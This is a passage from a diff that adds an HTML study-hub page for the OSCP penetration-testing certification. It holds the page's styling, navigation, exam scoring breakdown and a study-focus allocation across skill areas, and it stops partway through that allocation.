@@ -1,0 +1,1529 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="An unofficial OSCP / PEN-200 study hub: a phase-based preparation plan, a full command cheat sheet, a handy toolbox, and a searchable index of TJnull-recommended HackTheBox and Proving Grounds boxes.">
+<meta name="color-scheme" content="dark light">
+<meta name="theme-color" content="#0c0f0d">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 28 28'%3E%3Crect x='2' y='2' width='24' height='24' rx='6.5' fill='%230c0f0d' stroke='%23d7e3da' stroke-width='2'/%3E%3Cpath d='M8 10l4 4-4 4' fill='none' stroke='%23ff5f3d' stroke-width='2.4' stroke-linecap='round' stroke-linejoin='round'/%3E%3Cpath d='M15 18.5h5' stroke='%23ff5f3d' stroke-width='2.4' stroke-linecap='round'/%3E%3C/svg%3E">
+<meta property="og:title" content="OSCP Resource Hub">
+<meta property="og:description" content="Preparation plan, cheat sheet, toolbox, and a searchable HTB / Proving Grounds box index for OSCP.">
+<meta property="og:type" content="website">
+<title>OSCP Resource Hub // Preparation, Cheat Sheet & Box Index</title>
+<style>
+  :root {
+    /* dark is the default: terminal-first */
+    --bg: #0c0f0d; --panel: #121613; --panel-2: #18201b; --panel-3: #202a23;
+    --ink: #d7e3da; --ink-soft: #93a79a; --ink-faint: #61756a;
+    --line: #223027; --line-strong: #33463a;
+    --accent: #ff5f3d; --accent-deep: #ff7d5c;
+    --owned: #33d17a; --owned-bg: #10231a;
+    --warn: #e6c14a; --warn-bg: #241f10; --hard: #ff5f5f;
+    --mono: ui-monospace, "Cascadia Code", "JetBrains Mono", "SF Mono", Consolas, "Liberation Mono", monospace;
+    --sans: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, system-ui, sans-serif;
+    --serif: ui-monospace, "Cascadia Code", "JetBrains Mono", "SF Mono", Consolas, monospace;
+    --maxw: 1140px;
+  }
+  @media (prefers-color-scheme: light) {
+    :root {
+      --bg: #f4f2ee; --panel: #fbfaf8; --panel-2: #efece6; --panel-3: #e7e2d8;
+      --ink: #1c1a17; --ink-soft: #4a453d; --ink-faint: #7b7469;
+      --line: #ddd7cc; --line-strong: #c7bfb0;
+      --accent: #d6461f; --accent-deep: #ad3413;
+      --owned: #1f7a5c; --owned-bg: #e2efe9;
+      --warn: #b8860b; --warn-bg: #f3ecd6; --hard: #c0392b;
+    }
+  }
+  :root[data-theme="dark"] {
+    --bg: #0c0f0d; --panel: #121613; --panel-2: #18201b; --panel-3: #202a23;
+    --ink: #d7e3da; --ink-soft: #93a79a; --ink-faint: #61756a;
+    --line: #223027; --line-strong: #33463a;
+    --accent: #ff5f3d; --accent-deep: #ff7d5c;
+    --owned: #33d17a; --owned-bg: #10231a;
+    --warn: #e6c14a; --warn-bg: #241f10; --hard: #ff5f5f;
+  }
+  :root[data-theme="light"] {
+    --bg: #f4f2ee; --panel: #fbfaf8; --panel-2: #efece6; --panel-3: #e7e2d8;
+    --ink: #1c1a17; --ink-soft: #4a453d; --ink-faint: #7b7469;
+    --line: #ddd7cc; --line-strong: #c7bfb0;
+    --accent: #d6461f; --accent-deep: #ad3413;
+    --owned: #1f7a5c; --owned-bg: #e2efe9;
+    --warn: #b8860b; --warn-bg: #f3ecd6; --hard: #c0392b;
+  }
+
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body { margin: 0; background: var(--bg); color: var(--ink); font-family: var(--sans); line-height: 1.6; -webkit-font-smoothing: antialiased; }
+  .wrap { max-width: var(--maxw); margin: 0 auto; padding: 0 24px; }
+  a { color: var(--accent); text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  h1,h2,h3,h4 { text-wrap: balance; line-height: 1.15; }
+  code { font-family: var(--mono); font-size: 0.9em; background: var(--panel-2); padding: 1px 5px; border-radius: 4px; }
+
+  /* header */
+  header.top { position: sticky; top: 0; z-index: 60; background: color-mix(in srgb, var(--bg) 92%, transparent); backdrop-filter: blur(10px); border-bottom: 1px solid var(--line); }
+  .top .wrap { display: flex; align-items: center; gap: 14px; height: 58px; }
+  .brand { display: flex; align-items: center; gap: 9px; font-family: var(--mono); font-weight: 700; letter-spacing: -0.02em; font-size: 15px; color: var(--ink); cursor: pointer; margin-right: auto; }
+  .brand:hover { text-decoration: none; }
+  .brand .logo { width: 27px; height: 27px; flex: none; color: var(--ink); }
+  .brand .logo .lg-p { stroke: var(--accent); }
+  .brand .sq { color: var(--accent); }
+  nav.tabs { display: flex; gap: 2px; align-items: center; }
+  nav.tabs a { font-family: var(--mono); font-size: 12.5px; color: var(--ink-soft); padding: 7px 11px; border-radius: 7px; white-space: nowrap; cursor: pointer; }
+  nav.tabs a:hover { background: var(--panel-2); text-decoration: none; color: var(--ink); }
+  nav.tabs a.active { background: var(--accent); color: #fff; }
+  .top-controls { display: flex; align-items: center; gap: 8px; }
+  .theme-btn { font-family: var(--mono); font-size: 12px; background: var(--panel-2); border: 1px solid var(--line); color: var(--ink-soft); border-radius: 6px; padding: 6px 11px; cursor: pointer; }
+  .theme-btn:hover { color: var(--ink); border-color: var(--line-strong); }
+  .menu-toggle { display: none; flex-direction: column; justify-content: center; gap: 4px; width: 36px; height: 32px; background: var(--panel-2); border: 1px solid var(--line); border-radius: 7px; cursor: pointer; padding: 0; }
+  .menu-toggle span { display: block; width: 17px; height: 2px; background: var(--ink-soft); margin: 0 auto; transition: transform .2s, opacity .2s; }
+  .menu-toggle.open span:nth-child(1) { transform: translateY(6px) rotate(45deg); }
+  .menu-toggle.open span:nth-child(2) { opacity: 0; }
+  .menu-toggle.open span:nth-child(3) { transform: translateY(-6px) rotate(-45deg); }
+
+  .page { display: none; animation: fade .25s ease; }
+  .page.active { display: block; }
+  @keyframes fade { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: none; } }
+  @media (prefers-reduced-motion: reduce) { .page { animation: none; } html { scroll-behavior: auto; } }
+
+  .kicker { font-family: var(--mono); font-size: 12px; letter-spacing: 0.16em; text-transform: uppercase; color: var(--accent); font-weight: 600; }
+  section { padding: 46px 0; border-bottom: 1px solid var(--line); scroll-margin-top: 70px; }
+  .sec-head { display: flex; align-items: baseline; gap: 14px; margin-bottom: 22px; }
+  .sec-num { font-family: var(--mono); font-size: 13px; color: var(--accent); font-weight: 700; }
+  .sec-head h2 { font-family: var(--serif); font-size: clamp(24px,3.4vw,32px); margin: 0; letter-spacing: -0.01em; }
+  .lead { color: var(--ink-soft); max-width: 70ch; margin: -6px 0 22px; }
+
+  /* hero */
+  .hero { padding: 60px 0 42px; border-bottom: 1px solid var(--line); }
+  .hero h1 { font-family: var(--serif); font-weight: 700; font-size: clamp(34px,6vw,60px); margin: 14px 0 10px; letter-spacing: -0.02em; }
+  .hero .sub { font-size: clamp(16px,2.3vw,20px); color: var(--ink-soft); max-width: 62ch; }
+  .stat-row { display: flex; flex-wrap: wrap; gap: 12px; margin-top: 30px; }
+  .stat { background: var(--panel); border: 1px solid var(--line); border-radius: 10px; padding: 13px 17px; min-width: 110px; flex: 1 1 110px; }
+  .stat .n { font-family: var(--mono); font-size: 24px; font-weight: 700; color: var(--accent); letter-spacing: -0.02em; }
+  .stat .l { font-size: 12px; color: var(--ink-faint); text-transform: uppercase; letter-spacing: 0.05em; margin-top: 2px; }
+
+  /* nav cards on home */
+  .navcards { display: grid; grid-template-columns: repeat(auto-fit,minmax(240px,1fr)); gap: 14px; margin-top: 8px; }
+  .navcard { background: var(--panel); border: 1px solid var(--line); border-radius: 14px; padding: 22px; cursor: pointer; transition: border-color .15s, transform .15s; }
+  .navcard:hover { border-color: var(--accent); transform: translateY(-2px); }
+  .navcard .ic { font-family: var(--mono); font-size: 12px; color: var(--accent); font-weight: 700; letter-spacing: 0.1em; }
+  .navcard h3 { margin: 10px 0 6px; font-size: 19px; font-family: var(--serif); }
+  .navcard p { margin: 0; font-size: 14px; color: var(--ink-soft); }
+  .navcard .go { margin-top: 12px; font-family: var(--mono); font-size: 12.5px; color: var(--accent); }
+
+  .card { background: var(--panel); border: 1px solid var(--line); border-radius: 12px; padding: 20px; }
+  .exam-grid { display: grid; grid-template-columns: repeat(auto-fit,minmax(220px,1fr)); gap: 14px; }
+  .card h3 { margin: 0 0 6px; font-size: 16px; }
+  .pts { font-family: var(--mono); font-weight: 700; color: var(--accent); font-size: 15px; }
+  .card p { margin: 8px 0 0; font-size: 14px; color: var(--ink-soft); }
+  .two { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+  .callout { display: flex; gap: 14px; background: var(--panel); border: 1px solid var(--line); border-left: 4px solid var(--accent); border-radius: 10px; padding: 15px 18px; margin-top: 18px; }
+  .callout .ic { color: var(--accent); font-family: var(--mono); font-weight: 700; flex: none; }
+  .callout p { margin: 0; font-size: 14px; color: var(--ink-soft); }
+  .callout strong { color: var(--ink); }
+
+  /* meter */
+  .passbar { margin-top: 22px; background: var(--panel); border: 1px solid var(--line); border-radius: 12px; padding: 20px; }
+  .meter { height: 30px; border-radius: 8px; overflow: hidden; display: flex; border: 1px solid var(--line-strong); }
+  .meter span { display: flex; align-items: center; justify-content: center; font-family: var(--mono); font-size: 12px; font-weight: 700; color: #fff; }
+  .seg-a { background: var(--accent); } .seg-c { background: var(--owned); }
+  .passline { display: flex; justify-content: space-between; font-family: var(--mono); font-size: 12px; color: var(--ink-faint); margin-top: 8px; }
+
+  /* weeks */
+  .week { display: grid; grid-template-columns: 92px 1fr; gap: 20px; padding: 22px 0; border-top: 1px dashed var(--line-strong); }
+  .week:first-child { border-top: none; }
+  .week .wnum { font-family: var(--mono); font-size: 12px; letter-spacing: 0.1em; text-transform: uppercase; color: var(--ink-faint); }
+  .week .wbig { font-family: var(--serif); font-size: 30px; font-weight: 700; color: var(--accent); line-height: 1; margin-top: 4px; }
+  .week h3 { margin: 0 0 6px; font-size: 18px; }
+  .week .goal { font-size: 13px; color: var(--ink-faint); font-family: var(--mono); margin-bottom: 12px; }
+  .tasklist { list-style: none; padding: 0; margin: 0; display: grid; gap: 7px; }
+  .tasklist li { display: flex; gap: 10px; font-size: 14.5px; color: var(--ink-soft); align-items: baseline; }
+  .tasklist li::before { content: "▸"; color: var(--accent); font-size: 12px; flex: none; }
+  .chips { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 12px; }
+  .chip { font-family: var(--mono); font-size: 11.5px; padding: 3px 9px; border-radius: 20px; background: var(--panel-2); border: 1px solid var(--line); color: var(--ink-soft); }
+
+  /* cheat sheet */
+  .subnav { position: sticky; top: 58px; z-index: 40; background: color-mix(in srgb,var(--bg) 92%,transparent); backdrop-filter: blur(8px); border-bottom: 1px solid var(--line); padding: 10px 0; margin-bottom: 8px; }
+  .subnav .wrap { display: flex; gap: 6px; flex-wrap: wrap; }
+  .subnav a { font-family: var(--mono); font-size: 12px; padding: 5px 10px; border-radius: 6px; background: var(--panel-2); border: 1px solid var(--line); color: var(--ink-soft); cursor: pointer; }
+  .subnav a:hover { color: var(--ink); border-color: var(--line-strong); text-decoration: none; }
+  .cheat-block { margin: 30px 0; scroll-margin-top: 120px; }
+  .cheat-block > h3 { font-family: var(--serif); font-size: 23px; margin: 0 0 4px; display: flex; align-items: baseline; gap: 10px; }
+  .cheat-block > h3 .tag { font-family: var(--mono); font-size: 11px; color: #fff; background: var(--accent); padding: 2px 8px; border-radius: 5px; font-weight: 700; }
+  .cheat-block > p { color: var(--ink-soft); font-size: 14px; margin: 4px 0 16px; max-width: 74ch; }
+  .cheat-sub { font-family: var(--mono); font-size: 13px; color: var(--accent); font-weight: 700; margin: 18px 0 6px; letter-spacing: 0.02em; }
+  .code { background: var(--panel); border: 1px solid var(--line); border-radius: 10px; overflow: hidden; margin: 8px 0; }
+  .code pre { margin: 0; padding: 14px 16px; overflow-x: auto; font-family: var(--mono); font-size: 12.5px; line-height: 1.75; color: var(--ink); }
+  pre .c { color: var(--ink-faint); } pre .k { color: var(--accent); } pre .s { color: var(--owned); }
+  .note { font-size: 13px; color: var(--ink-soft); background: var(--warn-bg); border: 1px solid var(--line); border-left: 3px solid var(--warn); border-radius: 8px; padding: 10px 14px; margin: 10px 0; }
+  .note b { color: var(--ink); }
+
+  /* boxes */
+  .boxctl { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; margin-bottom: 8px; }
+  .boxsearch { flex: 1 1 220px; }
+  .boxsearch input { width: 100%; font-family: var(--mono); font-size: 13px; padding: 9px 12px; border-radius: 8px; border: 1px solid var(--line-strong); background: var(--panel); color: var(--ink); }
+  .boxsearch input:focus { outline: 2px solid var(--accent); outline-offset: 1px; }
+  .filters { display: flex; flex-wrap: wrap; gap: 6px; }
+  .filt { font-family: var(--mono); font-size: 12px; padding: 6px 11px; border-radius: 7px; background: var(--panel-2); border: 1px solid var(--line); color: var(--ink-soft); cursor: pointer; }
+  .filt:hover { color: var(--ink); }
+  .filt.on { background: var(--accent); color: #fff; border-color: var(--accent); }
+  .boxcount { font-family: var(--mono); font-size: 12.5px; color: var(--ink-faint); margin: 12px 0; }
+  .boxgrid { display: grid; grid-template-columns: repeat(auto-fill,minmax(280px,1fr)); gap: 12px; }
+  .box { background: var(--panel); border: 1px solid var(--line); border-radius: 11px; overflow: hidden; }
+  .box-head { display: flex; align-items: center; gap: 10px; padding: 13px 15px; cursor: pointer; }
+  .box-head:hover { background: var(--panel-2); }
+  .diffdot { width: 10px; height: 10px; border-radius: 50%; flex: none; }
+  .d-Easy { background: var(--owned); } .d-Medium { background: var(--warn); } .d-Hard { background: var(--hard); }
+  .box-name { font-family: var(--mono); font-weight: 700; font-size: 14.5px; flex: 1; }
+  .box-badges { display: flex; gap: 5px; }
+  .badge { font-family: var(--mono); font-size: 10px; padding: 2px 7px; border-radius: 20px; border: 1px solid var(--line-strong); color: var(--ink-faint); text-transform: uppercase; letter-spacing: 0.04em; }
+  .badge.htb { color: #9fef00; border-color: #5a7d0022; background: #9fef0015; }
+  .badge.pg { color: var(--accent); border-color: var(--accent); background: color-mix(in srgb,var(--accent) 10%,transparent); }
+  .box-arrow { color: var(--ink-faint); font-family: var(--mono); transition: transform .18s; }
+  .box.open .box-arrow { transform: rotate(90deg); }
+  .box-body { display: none; padding: 0 15px 15px; border-top: 1px solid var(--line); }
+  .box.open .box-body { display: block; }
+  .box-meta { display: flex; flex-wrap: wrap; gap: 6px; margin: 12px 0; }
+  .kv { font-size: 13px; margin: 7px 0; color: var(--ink-soft); }
+  .kv b { font-family: var(--mono); font-size: 11px; color: var(--accent); text-transform: uppercase; letter-spacing: 0.05em; display: block; margin-bottom: 1px; }
+  .box-links { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 12px; }
+  .box-links a { font-family: var(--mono); font-size: 12px; padding: 6px 11px; border-radius: 7px; background: var(--panel-2); border: 1px solid var(--line); color: var(--ink); }
+  .box-links a:hover { border-color: var(--accent); text-decoration: none; }
+
+  /* resources */
+  .res-grid { display: grid; grid-template-columns: repeat(auto-fit,minmax(260px,1fr)); gap: 14px; }
+  .rescard { background: var(--panel); border: 1px solid var(--line); border-radius: 12px; padding: 18px; }
+  .rescard h3 { margin: 0 0 12px; font-size: 15px; font-family: var(--serif); }
+  .reslist { list-style: none; padding: 0; margin: 0; display: grid; gap: 9px; }
+  .reslist li { font-size: 13.5px; display: flex; flex-direction: column; }
+  .reslist a { font-family: var(--mono); font-size: 13px; }
+  .reslist .desc { color: var(--ink-faint); font-size: 12px; }
+
+  .flow { display: grid; gap: 10px; }
+  .step { display: grid; grid-template-columns: 40px 1fr; gap: 16px; align-items: start; background: var(--panel); border: 1px solid var(--line); border-radius: 10px; padding: 14px 16px; }
+  .step .st { font-family: var(--mono); font-weight: 700; color: var(--accent); font-size: 20px; }
+  .step h4 { margin: 0 0 3px; font-size: 15px; } .step p { margin: 0; font-size: 13.5px; color: var(--ink-soft); }
+
+  footer { padding: 44px 0 60px; color: var(--ink-faint); font-size: 13px; border-top: 1px solid var(--line); margin-top: 8px; }
+  footer .wrap { display: grid; gap: 20px; }
+  .foot-top { display: flex; flex-wrap: wrap; gap: 20px 40px; justify-content: space-between; align-items: flex-start; }
+  .foot-brand { font-family: var(--mono); font-weight: 700; color: var(--ink); font-size: 15px; }
+  .foot-brand .sq { color: var(--accent); }
+  .foot-brand + p { margin: 6px 0 0; max-width: 46ch; color: var(--ink-soft); }
+  .foot-links { display: flex; flex-wrap: wrap; gap: 6px 16px; }
+  .foot-links a { font-family: var(--mono); font-size: 12.5px; color: var(--ink-soft); cursor: pointer; }
+  .foot-links a:hover { color: var(--accent); text-decoration: none; }
+  .foot-bottom { display: flex; flex-wrap: wrap; gap: 8px 18px; justify-content: space-between; align-items: center; border-top: 1px solid var(--line); padding-top: 16px; font-family: var(--mono); font-size: 12px; }
+  .foot-disclaimer { max-width: 74ch; line-height: 1.7; }
+  .foot-disclaimer b { color: var(--ink-soft); }
+
+  /* focus / weighting */
+  .focus-legend { display: flex; flex-wrap: wrap; gap: 18px; font-family: var(--mono); font-size: 12px; color: var(--ink-faint); margin: 4px 0 14px; }
+  .focus-legend b { color: var(--ink-soft); font-weight: 700; }
+  .focus-tbl { display: grid; gap: 10px; }
+  .focusrow { background: var(--panel); border: 1px solid var(--line); border-radius: 11px; padding: 13px 16px; display: grid; gap: 8px; }
+  .focusrow.big { border-color: var(--owned); border-width: 1.5px; }
+  .frow-head { display: flex; align-items: center; gap: 10px; }
+  .frow-head .dname { font-weight: 600; font-size: 15px; flex: 1; }
+  .exval { font-family: var(--mono); font-size: 11.5px; padding: 3px 9px; border-radius: 6px; border: 1px solid var(--line-strong); color: var(--ink-soft); white-space: nowrap; }
+  .exval.pts { color: var(--owned); border-color: var(--owned); background: var(--owned-bg); font-weight: 700; }
+  .barwrap { display: grid; grid-template-columns: 1fr 78px; gap: 12px; align-items: center; }
+  .bar { position: relative; height: 22px; background: var(--panel-2); border-radius: 6px; overflow: hidden; border: 1px solid var(--line); }
+  .bar > i { position: absolute; left: 0; top: 0; bottom: 0; background: var(--accent); border-radius: 6px 0 0 6px; }
+  .focusrow.big .bar > i { background: var(--owned); }
+  .pct { font-family: var(--mono); font-weight: 700; font-size: 14px; color: var(--ink); text-align: right; font-variant-numeric: tabular-nums; }
+  .pct small { display: block; font-weight: 400; font-size: 11px; color: var(--ink-faint); }
+  .frat { font-size: 13px; color: var(--ink-soft); }
+
+  /* ports quick-ref */
+  .portgrid { display: grid; grid-template-columns: repeat(auto-fill, minmax(330px, 1fr)); gap: 14px; }
+  .portcard { background: var(--panel); border: 1px solid var(--line); border-radius: 12px; padding: 16px 16px 14px; }
+  .portcard .ph { display: flex; align-items: center; gap: 10px; margin-bottom: 4px; }
+  .portcard .pno { font-family: var(--mono); font-weight: 700; color: var(--accent); font-size: 15.5px; }
+  .portcard .psvc { font-family: var(--mono); font-weight: 700; color: var(--ink); font-size: 13px; letter-spacing: 0.02em; }
+  .portcard .pcat { margin-left: auto; font-family: var(--mono); font-size: 9.5px; text-transform: uppercase; letter-spacing: 0.06em; color: var(--ink-faint); border: 1px solid var(--line-strong); border-radius: 20px; padding: 2px 8px; }
+  .portcard .pdesc { font-size: 13px; color: var(--ink-soft); margin: 4px 0 10px; }
+  .portcard .code { margin: 0 0 10px; }
+  .portcard .code pre { font-size: 12px; padding: 11px 13px; }
+  .portcard .pnote { font-size: 12.5px; color: var(--ink-soft); line-height: 1.55; }
+  .portcard .pnote b { color: var(--accent); font-family: var(--mono); font-size: 10px; text-transform: uppercase; letter-spacing: 0.05em; display: block; margin-bottom: 2px; }
+  .portcard .pref { margin-top: 11px; }
+  .portcard .pref a { font-family: var(--mono); font-size: 11.5px; color: var(--ink-soft); border: 1px solid var(--line); border-radius: 6px; padding: 4px 10px; }
+  .portcard .pref a:hover { border-color: var(--accent); color: var(--ink); text-decoration: none; }
+
+  /* collapse the top menu into a hamburger on narrow screens */
+  @media (max-width: 920px) {
+    .menu-toggle { display: flex; }
+    nav.tabs {
+      position: absolute; top: 58px; left: 0; right: 0;
+      flex-direction: column; align-items: stretch; gap: 4px; margin: 0;
+      background: var(--panel); border-bottom: 1px solid var(--line);
+      padding: 10px 16px 14px; box-shadow: 0 14px 30px rgba(0,0,0,.30);
+      display: none;
+    }
+    nav.tabs.open { display: flex; }
+    nav.tabs a { padding: 12px 14px; font-size: 14px; border-radius: 8px; }
+  }
+  @media (prefers-reduced-motion: reduce) { .menu-toggle span { transition: none; } }
+  @media (max-width: 720px) {
+    .two { grid-template-columns: 1fr; }
+    .week { grid-template-columns: 1fr; gap: 8px; }
+  }
+  @media (max-width: 440px) {
+    .wrap { padding: 0 16px; }
+    .brand-txt { display: none; }
+    .hero { padding: 44px 0 30px; }
+  }
+</style>
+</head>
+<body>
+<header class="top">
+  <div class="wrap">
+    <span class="brand" data-nav="home" role="button" tabindex="0" aria-label="OSCP Hub, go to home">
+      <svg class="logo" viewBox="0 0 28 28" fill="none" aria-hidden="true">
+        <rect x="2" y="2" width="24" height="24" rx="6.5" stroke="currentColor" stroke-width="2"/>
+        <path class="lg-p" d="M8 10l4 4-4 4" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/>
+        <path class="lg-p" d="M15 18.5h5" stroke-width="2.4" stroke-linecap="round"/>
+      </svg>
+      <span class="brand-txt">oscp<span class="sq">::</span>hub</span>
+    </span>
+    <nav class="tabs" id="tabs">
+      <a data-nav="home">Home</a>
+      <a data-nav="plan">Preparation Plan</a>
+      <a data-nav="cheatsheet">Cheat Sheet</a>
+      <a data-nav="toolbox">Toolbox</a>
+      <a data-nav="ports">Ports</a>
+      <a data-nav="boxes">Box Index</a>
+      <a data-nav="resources">Resources</a>
+    </nav>
+    <div class="top-controls">
+      <button class="theme-btn" id="themeBtn" aria-label="Toggle light or dark theme">theme</button>
+      <button class="menu-toggle" id="menuToggle" aria-label="Open navigation menu" aria-expanded="false" aria-controls="tabs"><span></span><span></span><span></span></button>
+    </div>
+  </div>
+</header>
+
+<!-- ==================== HOME ==================== -->
+<div class="page active" id="page-home">
+  <div class="hero">
+    <div class="wrap">
+      <div class="kicker">PEN-200 // OSCP resource hub // built for the AD-set exam</div>
+      <h1>OSCP Resource Hub</h1>
+      <p class="sub">Everything to go from beginner to certified in one place: a structured preparation plan, a deep command cheat sheet, and a clickable index of every TJnull-recommended HackTheBox and Proving Grounds box, each with real reference links.</p>
+      <div class="stat-row">
+        <div class="stat"><div class="n">70</div><div class="l">points to pass</div></div>
+        <div class="stat"><div class="n">3+1</div><div class="l">standalone + AD set</div></div>
+        <div class="stat"><div class="n" id="boxTotal">--</div><div class="l">boxes indexed</div></div>
+        <div class="stat"><div class="n">9</div><div class="l">cheat domains</div></div>
+        <div class="stat"><div class="n">40</div><div class="l">AD set points</div></div>
+      </div>
+    </div>
+  </div>
+  <main class="wrap">
+    <section style="border:none">
+      <div class="navcards">
+        <div class="navcard" data-nav="plan"><div class="ic">01 // ROADMAP</div><h3>Preparation Plan</h3><p>Phase by phase: enumeration, privilege escalation, Active Directory, machine grinding, then exam simulation.</p><div class="go">Open the plan &gt;</div></div>
+        <div class="navcard" data-nav="cheatsheet"><div class="ic">02 // ATTACK REFERENCE</div><h3>Full Cheat Sheet</h3><p>Detailed commands across 9 attack domains: enum, web, privesc, AD, pivoting, shells, cracking.</p><div class="go">Open the cheat sheet &gt;</div></div>
+        <div class="navcard" data-nav="toolbox"><div class="ic">03 // HANDY TOOLBOX</div><h3>Everyday Toolbox</h3><p>The common tools you use constantly: SSH and keys, scp/ftp, netcat, serving files, compiling exploits, /etc/hosts, tmux.</p><div class="go">Open the toolbox &gt;</div></div>
+        <div class="navcard" data-nav="ports"><div class="ic">04 // QUICK REF</div><h3>Common Ports</h3><p>Searchable port lookup for CTF: one-liner per service, the go-to enum commands, common attack vectors, and references.</p><div class="go">Look up a port &gt;</div></div>
+        <div class="navcard" data-nav="boxes"><div class="ic">05 // PRACTICE</div><h3>Box Index</h3><p>Searchable, filterable list of HTB and Proving Grounds boxes with attack vectors and writeup links.</p><div class="go">Browse the boxes &gt;</div></div>
+        <div class="navcard" data-nav="resources"><div class="ic">06 // LINKS</div><h3>Resources</h3><p>Every external tool, wordlist, writeup channel, and official OffSec page worth bookmarking.</p><div class="go">See resources &gt;</div></div>
+      </div>
+    </section>
+
+    <section id="exam">
+      <div class="sec-head"><span class="sec-num">01</span><h2>What you're graded on</h2></div>
+      <p class="lead">100 points across four targets. You need <strong>70</strong>. Know the scoreboard before spending a single study hour.</p>
+      <div class="exam-grid">
+        <div class="card"><h3>Standalone #1 <span class="pts">20 pts</span></h3><p>Independent host. ~10 for foothold (<code>local.txt</code>), ~10 for root/SYSTEM (<code>proof.txt</code>).</p></div>
+        <div class="card"><h3>Standalone #2 <span class="pts">20 pts</span></h3><p>Independent host. Same split. Pure enumerate → exploit → escalate.</p></div>
+        <div class="card"><h3>Standalone #3 <span class="pts">20 pts</span></h3><p>Independent host. Same split. Broad exploit &amp; privesc toolkit pays off here.</p></div>
+        <div class="card" style="border-color:var(--owned);border-width:1.5px"><h3>Active Directory Set <span class="pts" style="color:var(--owned)">40 pts</span></h3><p>Chained domain: foothold, then lateral movement, then Domain Controller. Points are awarded per host, but you have to pivot through the chain.</p></div>
+      </div>
+      <div class="passbar">
+        <div style="font-family:var(--mono);font-size:12px;color:var(--ink-faint);margin-bottom:10px;text-transform:uppercase;letter-spacing:0.06em">The scoreboard // pass line at 70</div>
+        <div class="meter"><span class="seg-a" style="width:60%">3 x Standalone = 60</span><span class="seg-c" style="width:40%">AD Set = 40</span></div>
+        <div class="passline"><span>0</span><span>70 to pass</span><span>100 (+10 bonus)</span></div>
+        <p style="font-size:13.5px;color:var(--ink-soft);margin:14px 0 0"><strong style="color:var(--ink)">Winning math:</strong> AD set (40) + one full standalone (20) + one foothold (10) = <strong>70</strong>. The AD set is the biggest single block, which makes it the highest-leverage skill to master.</p>
+      </div>
+      <div class="two" style="margin-top:18px">
+        <div class="callout"><span class="ic">+10</span><p><strong>Bonus.</strong> Submit the required PEN-200 exercises <em>and</em> 30 lab machines in your report for +10. Nearly-free points if you have the subscription.</p></div>
+        <div class="callout"><span class="ic">MSF</span><p><strong>Metasploit rule.</strong> Exploit and post modules on <em>one</em> standalone only, not the AD set. <code>msfvenom</code> and <code>multi/handler</code> are unrestricted. No <code>sqlmap</code> or automated exploitation, no Burp active scanner.</p></div>
+      </div>
+      <div class="callout" style="border-left-color:var(--warn)"><span class="ic" style="color:var(--warn)">[!]</span><p>Exam format changes over time. <strong>Always confirm the current rules on the official OffSec exam guide</strong> (linked in Resources) before you book.</p></div>
+    </section>
+
+    <section id="focus">
+      <div class="sec-head"><span class="sec-num">02</span><h2>Where to focus, and how much</h2></div>
+      <p class="lead">Two different things, kept separate on purpose. The <strong>official exam weight</strong> is a hard fact from OffSec's points structure. The <strong>recommended focus</strong> is derived study guidance, because point value is not the same as how hard a skill is to learn.</p>
+      <div class="callout" style="border-left-color:var(--warn)"><span class="ic" style="color:var(--warn)">[i]</span><p><strong>On "official data":</strong> OffSec publishes the <em>points</em> structure (AD set = 40, three standalones = 60) and the <a href="https://www.offsec.com/courses/pen-200/" target="_blank" rel="noopener">PEN-200 module list</a>. That is all it publishes. It does <strong>not</strong> release a per-topic exam percentage, so anyone quoting "SQLi is 12% of the exam" is guessing. The bars below are a reasoned allocation, not an OffSec metric.</p></div>
+
+      <div class="focus-legend">
+        <span><b>Official exam weight</b> = share of the 100 exam points</span>
+        <span><b>Recommended focus</b> = share of your study effort (relative weighting, not fixed hours)</span>
+      </div>
+
+      <div class="focus-tbl">
+        <div class="focusrow big">
+          <div class="frow-head"><span class="dname">Active Directory</span><span class="exval pts">40 of 100 pts // official</span></div>
+          <div class="barwrap"><div class="bar"><i style="width:30%"></i></div><span class="pct">30%</span></div>
+          <div class="frat">The single biggest block and the steepest learning curve. Highest leverage on the whole exam, so over-invest here. Practice full chains, not isolated techniques.</div>
+        </div>
+        <div class="focusrow">
+          <div class="frow-head"><span class="dname">Enumeration &amp; Recon</span><span class="exval">cross-cutting // every target</span></div>
+          <div class="barwrap"><div class="bar"><i style="width:15%"></i></div><span class="pct">15%</span></div>
+          <div class="frat">Not worth points directly, but it decides whether you find the foothold at all. The number one reason people get stuck. A permanent discipline, not a one-off topic.</div>
+        </div>
+        <div class="focusrow">
+          <div class="frow-head"><span class="dname">Web &amp; Service Exploitation</span><span class="exval">foothold // most standalones</span></div>
+          <div class="barwrap"><div class="bar"><i style="width:15%"></i></div><span class="pct">15%</span></div>
+          <div class="frat">How you get the initial shell on most standalones. Manual SQLi, LFI/RFI, upload bypass, command injection, plus recognising versioned public exploits fast.</div>
+        </div>
+        <div class="focusrow">
+          <div class="frow-head"><span class="dname">Windows Privilege Escalation</span><span class="exval">standalone escalation</span></div>
+          <div class="barwrap"><div class="bar"><i style="width:12%"></i></div><span class="pct">12%</span></div>
+          <div class="frat">Turns footholds into proof.txt on Windows targets. Token and Potato abuse, service misconfigs, AlwaysInstallElevated. Usually the slower half of privesc for most people.</div>
+        </div>
+        <div class="focusrow">
+          <div class="frow-head"><span class="dname">Linux Privilege Escalation</span><span class="exval">standalone escalation</span></div>
+          <div class="barwrap"><div class="bar"><i style="width:11%"></i></div><span class="pct">11%</span></div>
+          <div class="frat">sudo/GTFOBins, SUID, cron, capabilities, PATH. More pattern-based than Windows, so you get fast at it quickly and can spend slightly less time on it.</div>
+        </div>
+        <div class="focusrow">
+          <div class="frow-head"><span class="dname">Tunneling &amp; Pivoting</span><span class="exval">enables the AD 40 pts</span></div>
+          <div class="barwrap"><div class="bar"><i style="width:6%"></i></div><span class="pct">6%</span></div>
